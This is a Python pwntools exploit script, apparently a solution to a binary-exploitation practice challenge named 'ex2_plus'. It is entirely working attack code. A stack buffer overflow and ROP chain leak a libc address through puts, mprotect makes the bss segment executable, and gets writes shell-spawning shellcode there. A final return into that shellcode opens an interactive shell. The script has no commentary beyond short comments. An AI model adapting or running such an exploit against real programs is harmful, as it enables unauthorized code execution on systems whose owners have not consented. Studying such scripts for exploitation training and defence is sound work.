from pwn import *

p = process('./ex2_plus')
elf = ELF('./ex2_plus')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context(os='linux', arch='amd64')

pop_rdi_ret = 0x400623
main_addr = 0x40059f
bss_start_addr = 0x601000
shellcode_addr = 0x602000 - 0x100

padding = b'a' * 40

# leak libc
payload = padding + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main_addr)
p.recvuntil(b'Input:')
p.sendline(payload)

p.recvline()
leak_addr = u64((p.recvline().split(b'\x0a')[0]).ljust(8,b'\x00'))
success(hex(leak_addr))

libc.address = leak_addr - libc.sym['puts']
success('libc_base = 0x%x', libc.address)

# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rsi; ret'
pop_rsi_ret = libc.address + 0x023a6a
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rdx; ret'
pop_rdx_ret = libc.address + 0x001b96

# mprotect bss to rwx
payload = padding + p64(pop_rdi_ret) + p64(bss_start_addr) + p64(pop_rsi_ret) + p64(0x1000) + p64(pop_rdx_ret) + p64(0x7) + p64(libc.sym['mprotect']) + p64(main_addr)
p.recvuntil(b'Input:')
p.sendline(payload)

# shellcode
payload = padding + p64(pop_rdi_ret) + p64(shellcode_addr) + p64(libc.sym['gets']) + p64(main_addr)
p.recvuntil(b'Input:')
p.sendline(payload)
p.sendline(asm(shellcraft.amd64.sh()))

# ret2shellcode
payload = padding
payload += p64(shellcode_addr)
p.recvuntil(b'Input:')
p.sendline(payload)

p.interactive()

